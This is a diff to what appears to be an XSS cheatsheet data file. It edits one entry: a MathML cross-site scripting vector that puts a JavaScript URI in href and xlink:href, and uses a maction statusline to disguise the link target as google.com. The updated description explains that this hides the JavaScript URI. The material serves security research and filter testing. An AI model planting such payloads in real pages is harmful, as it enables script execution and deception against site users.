@@ -4537,9 +4537,9 @@ var items =
             'de'    : '',
             'zh'    : ''
         },
-        'data'      : '<math href="%js_uri_alert%">CLICKME</math>\r\n<math><maction actiontype="statusline#http://google.com" xlink:href="%js_uri_alert%">CLICKME</maction></math>',
+        'data'      : '<math href="%js_uri_alert%">CLICKME</math>\r\n\r\n<math>\r\n<maction actiontype="statusline#http://google.com" xlink:href="%js_uri_alert%">CLICKME</maction>\r\n</math>',
         'description' : {
-            'en'    : 'Modern Firefox versions allow usage of inline MathML. While other user agents don\'t support the href attribute for MathML elements (yet), Firefox does and thereby enables passive JavaScript execution. Note that supporting href for MathML elements is a feature - introduced with MathML 3. The same effect can be observed by using xlink:href.',
+            'en'    : 'Modern Firefox versions allow usage of inline MathML. While other user agents don\'t support the href attribute for MathML elements (yet), Firefox does and thereby enables passive JavaScript execution. Note that supporting href for MathML elements is a feature - introduced with MathML 3. The same effect can be observed by using xlink:href. The statusline action further enables obfuscation of the actual link target - and in this example hides the JavaScript URI.',
             'ja'    : '',
             'ru'    : '',
             'cs'    : '',
